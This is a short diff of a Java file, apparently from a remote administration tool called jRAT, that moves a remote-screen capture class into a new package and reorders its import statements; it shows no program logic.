@@ -1,10 +1,12 @@
-package jrat.client;
+package jrat.module.screen;
 
-import jrat.common.utils.ImageUtils;
+import jrat.client.Connection;
 import jrat.client.packets.outgoing.AbstractOutgoingPacket;
 import jrat.client.packets.outgoing.Packet26RemoteScreen;
 import jrat.client.packets.outgoing.Packet68RemoteScreenComplete;
 import jrat.client.utils.ScreenUtils;
+import jrat.common.utils.ImageUtils;
+
 import java.awt.Graphics2D;
 import java.awt.GraphicsDevice;
 import java.awt.GraphicsEnvironment;
